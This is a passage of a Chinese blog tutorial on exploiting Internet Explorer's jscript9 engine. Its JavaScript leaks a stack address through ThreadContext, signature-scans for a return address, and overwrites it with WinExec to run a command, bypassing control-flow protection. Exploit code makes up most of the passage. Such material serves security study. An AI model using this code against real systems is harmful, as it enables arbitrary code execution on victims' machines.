+<p>找到globalListFirst后，取其前四个字节，就可以获得链表中第一个ThreadContext对象的地址，在此对象中要关注的是0x8偏移处与0x18偏移处的两个值<br>
+<img src="https://img-blog.csdnimg.cn/50a0735af5644c92b588d1e128cdbeb6.png" alt="在这里插入图片描述"><br>
+其中0x8偏移处为一个指针，0x18处的值+0x1f0000就是要获取栈地址，此处可以发现指向下一个节点的指针为0，这说明此次刚好头指针即尾指针，链表中只有一个节点，当指针不为空时，说明链表中有一个以上节点，此时就需要取最后一个节点，此处需要注意的是指针指向的地址实际是ThreadContext对象虚表后的地址，也就是下一个节点ThreadContext对象+0x4的地址。<br>
+当取到尾节点后取其0x18偏移处的值，用此值+0x1f0000就是要得到的栈地址。</p>
+<pre><code class="prism language-js"><span class="token comment">////获取栈地址函数</span>
+		<span class="token keyword">function</span> <span class="token function">Js_GetStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token comment">//定义一个对象用于泄露jscript9基址</span>
+			<span class="token keyword">var</span> arr_tmp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//取到对象虚表</span>
+			<span class="token keyword">var</span> arr_vtable <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span><span class="token function">leak_object_adress</span><span class="token punctuation">(</span>arr_tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//获取jscript9基址</span>
+			<span class="token keyword">var</span> Jscript9_Base <span class="token operator">=</span> <span class="token function">Js_GetCurrentModuleBase</span><span class="token punctuation">(</span>arr_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//jscript9如果发生更改此偏移值就会改变</span>
+			<span class="token comment">//所以通过特征码匹配获取globalListFirst地址，即使偏移值改变也可以找到</span>
+			<span class="token keyword">var</span> globalListFirst_addr <span class="token operator">=</span> <span class="token function">Js_GetLinkToBeginning</span><span class="token punctuation">(</span>Jscript9_Base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//获取ThreadContext实例基址，+4后从虚表后的内容开始处理</span>
+			<span class="token keyword">var</span> ThreadContext_ObjAddr <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>globalListFirst_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> TheNext_Ptr <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>ThreadContext_ObjAddr <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> Tmp_Ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+			<span class="token keyword">while</span><span class="token punctuation">(</span>TheNext_Ptr <span class="token operator">!=</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+				Tmp_Ptr <span class="token operator">=</span> TheNext_Ptr<span class="token punctuation">;</span>
+				TheNext_Ptr <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>TheNext_Ptr <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token comment">//如果链表起始节点就是结束节点的话就不用执行if中内容</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span>Tmp_Ptr <span class="token operator">!=</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+				ThreadContext_ObjAddr <span class="token operator">=</span> Tmp_Ptr<span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token comment">//获取StackLimitForCurrentThread字段值</span>
+			<span class="token keyword">var</span> StackLimitForCurrentThread <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>ThreadContext_ObjAddr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//StackLimitForCurrentThread+0x1f0000可以得到一个接近esp地址的值</span>
+			<span class="token keyword">var</span> Stack_Top <span class="token operator">=</span> <span class="token punctuation">(</span>StackLimitForCurrentThread <span class="token operator">+</span> <span class="token number">0x1f0000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">return</span> Stack_Top<span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h2><a id="JsJavascriptStringEntrySplit_308"></a>Js::JavascriptString::EntrySplit返回地址</h2>
+<p>在拿到一个栈地址后，想要进一步利用，且也为了能绕过执行流保护，所以还需要找到一个返回地址，并覆盖其值，此处就以Js::JavascriptString::EntrySplit为例。<br>
+在代码最后添加</p>
+<pre><code class="prism language-js"><span class="token keyword">var</span> tg <span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+tg<span class="token punctuation">.</span><span class="token function-variable function">valueOf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token comment">//此处搜索返回地址</span>
+<span class="token punctuation">}</span>
+<span class="token string">"abc"</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span>tg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>此代码会隐式调用tg对象的valueOf函数，而valueOf底层会去调用Js::JavascriptString::EntrySplit函数，所以在拿到上文中的栈地址后，可以在valueOf会调用查找Js::JavascriptString::EntrySplit的返回地址，并覆盖他，在Js::JavascriptString::EntrySplit执行结束后，就可以转入指定的地址去执行代码。<br>
+然后在Js::JavascriptString::EntrySplit处下断点顺便验证上文中取到的栈地址是否准确<br>
+<img src="https://img-blog.csdnimg.cn/c251452ecadc4b36a8f6585eb497745f.png" alt="在这里插入图片描述"><br>
+此时程序转入Js::JavascriptString::EntrySplit，esp指向的地址中便存放着Js::JavascriptString::EntrySplit的返回地址，用上文中得到的值+0x1f0000可以看到，除了低三位其余各位都一致，剩下的就只剩找到esp指向的地址了<br>
+<img src="https://img-blog.csdnimg.cn/908516b920974ab4af89de14ed66ede5.png" alt="在这里插入图片描述"></p>
+<h3><a id="_327"></a>查找返回地址</h3>
+<p>查看调用栈或者esp中的值，来查看Js::JavascriptString::EntrySplit的返回地址<br>
+<img src="https://img-blog.csdnimg.cn/8d88a4e5a4f3436eaaceaea5472f9da5.png" alt="在这里插入图片描述"><br>
+710b9003是函数jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x93偏移处的一个地址<br>
+<img src="https://img-blog.csdnimg.cn/b6754e2866aa4eb18af649ac86d9bdf6.png" alt="在这里插入图片描述"><br>
+所以只要找到jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;地址再加0x93便能得到返回地址。但有两个问题：</p>
+<ol>
+<li>jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;函数既不是导入函数也不是导出函数，无法通过导入/导出表获得此函数地址</li>
+<li>如果直接通过jscript9模块基址+固定便宜的话，就会出现与上文提到的查找globalListFirst地址一样的问题，如果jscript9.dll发生任何改变，此偏移值就会发生改变，例如同样的偏移，在1803与1903的系统上偏移就完全不一样<br>
+所以综上所述，不能直接通过偏移的方法来获取返回地址，也无法通过查找函数地址来获取返回地址，所以只能采用与上文中获取globalListFirst的方法，使用特征码来获取。<br>
+<img src="https://img-blog.csdnimg.cn/cc4cd4d42c9e47fb87e9f474d5aa03e7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+可以用返回地址前的三条汇编代码来做特征码来进行查找</li>
+</ol>
+<pre><code class="prism language-js"><span class="token comment">////特征码获取Js::JavascriptString::EntrySplit执行完后的返回地址</span>
+		<span class="token keyword">function</span> <span class="token function">Js_GetCallFunction_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token comment">//定义一个对象用于泄露jscript9基址</span>
+			<span class="token keyword">var</span> arr_tmp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//取到对象虚表</span>
+			<span class="token keyword">var</span> arr_vtable <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span><span class="token function">leak_object_adress</span><span class="token punctuation">(</span>arr_tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//获取jscript9基址</span>
+			<span class="token keyword">var</span> base <span class="token operator">=</span> <span class="token function">Js_GetCurrentModuleBase</span><span class="token punctuation">(</span>arr_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//特征码找到返回地址处前9字节的代码特征码</span>
+			<span class="token comment">//原因也同上面globalListFirst地址查找函数，如果jscript9发生改变</span>
+			<span class="token comment">//那返回地址偏移也会发生改变，所以最保险的方法就是用特征码查找</span>
+			<span class="token keyword">var</span> Hex_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> address <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> pe_address <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x3c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> pe_optheader <span class="token operator">=</span> pe_address<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> code_size <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>pe_optheader <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> code_base <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> tmp_address <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+			<span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+			<span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> code_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">0x9</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read_8</span><span class="token punctuation">(</span>code_base <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">!=</span> Hex_code<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+						<span class="token keyword">break</span><span class="token punctuation">;</span>
+					<span class="token punctuation">}</span>
+				<span class="token punctuation">}</span>
+				<span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">break</span><span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+				code_base<span class="token operator">++</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> code_size<span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token comment">//+9正好为Js::JavascriptString::EntrySplit执行完后的返回地址</span>
+				address <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x9</span><span class="token punctuation">;</span>
+				<span class="token keyword">return</span> address<span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+
+</code></pre>
+<h3><a id="_384"></a>覆盖返回地址</h3>
+<p>现在以及取到一个存放返回地址的栈地址，也取到了返回地址（存放在进入Js::JavascriptString::EntrySplit函数时的esp寄存器中），通过观察可以发现取到的栈地址与进入Js::JavascriptString::EntrySplit函数时esp中的值虽然无法确定其差值，但是可以肯定的是这个差值肯定在0x0~0xfff之间，所以可以通过一个循环来查找存放着返回地址的地址，此地址很有可能就是要覆盖的地址。</p>
+<pre><code class="prism language-js">tg<span class="token punctuation">.</span><span class="token function-variable function">valueOf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		<span class="token keyword">var</span> esp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xfff</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">var</span> curr_stack_top <span class="token operator">=</span> Stack_Top <span class="token operator">+</span> i<span class="token punctuation">;</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read_32</span><span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span> <span class="token operator">===</span> ret_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+				esp <span class="token operator">=</span> <span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+		<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>运行后会发现取到的值与esp并不相同，怀疑可能在0~fff偏移范围内，可能不止一处保存着返回地址，故对以上代码进行更改</p>
+<pre><code class="prism language-js">tg<span class="token punctuation">.</span><span class="token function-variable function">valueOf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token comment">//有时会有多个会ret到CallFunction函数处的地址，用数组保存之后全部修改</span>
+	<span class="token keyword">var</span> esp_addrlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xfff</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		<span class="token keyword">var</span> curr_stack_top <span class="token operator">=</span> Stack_Top <span class="token operator">+</span> i<span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read_32</span><span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span> <span class="token operator">===</span> ret_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+			esp_addrlist<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+	<span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> esp_addrlist<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		s <span class="token operator">+=</span> esp_addrlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	<span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>结果验证了我的怀疑<br>
+<img src="https://img-blog.csdnimg.cn/d698f39271c647858347a15681c7a3e4.png" alt="在这里插入图片描述"><br>
+不过可以肯定的是，不管有几处保存着返回地址，但肯定有一处保存的返回地址是可用的<br>
+<img src="https://img-blog.csdnimg.cn/8304fb1c038544e39e17bd73021f3fce.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+所以使用最简单无脑的方法，那就是全部覆盖，最后使用在虚表劫持中写好的获取函数地址的函数获取到winexe函数地址，将其填入覆盖到返回地址处即可，调整后代码如下</p>
+<pre><code class="prism language-js">tg<span class="token punctuation">.</span><span class="token function-variable function">valueOf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token comment">//有时会有多个会ret到CallFunction函数处的地址，用数组保存之后全部修改</span>
+	<span class="token keyword">var</span> esp_addrlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0xfff</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		<span class="token keyword">var</span> curr_stack_top <span class="token operator">=</span> Stack_Top <span class="token operator">+</span> i<span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read_32</span><span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span> <span class="token operator">===</span> ret_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>
+			esp_addrlist<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>curr_stack_top<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+	<span class="token comment">//暴力方法，全部覆盖</span>
+	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> esp_addrlist<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		<span class="token comment">//winexec函数地址用于覆盖返回地址</span>
+		<span class="token function">write_32</span><span class="token punctuation">(</span>esp_addrlist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> winexec<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token comment">//winexec函数返回地址</span>
+		<span class="token function">write_32</span><span class="token punctuation">(</span>esp_addrlist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token comment">//winexec函数第一个参数</span>
+		<span class="token function">write_32</span><span class="token punctuation">(</span>esp_addrlist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> cmd_line<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token comment">//winexec函数第二个参数</span>
+		<span class="token function">write_32</span><span class="token punctuation">(</span>esp_addrlist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>最后执行代码验证结果<br>
+<img src="https://img-blog.csdnimg.cn/b7e7b29442164ec9b9bdd346930a87fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2><a id="_452"></a>常见问题</h2>
+<ul>
+<li>无法通过ThreadCntext找到栈地址或无法每次都能准确找到</li>
+<li>globalListFirst相较于jscript9模块基址的偏移在1803与1903上各不同</li>
+<li>返回地址相较于jscript9模块基址的偏移在1803与1903上各不同</li>
+</ul>
+<h2><a id="_458"></a>解决方法</h2>
+<ul>
+<li>通过globalListFirst获取到的ThreadContext实例并不是每次都是尾节点，当指向下一个节点的指针不为空时，需要获取到下一个节点，一直拿到全局链表中的最后一个节点的0x18偏移处的值</li>
+<li>先取得nt可选头从中取到代码节大小与基址，然后通过遍历查找特征码的方式取得globalListFirst地址</li>
+<li>思路同上</li>
+</ul>
+</div>
+</body>
+
+</html>
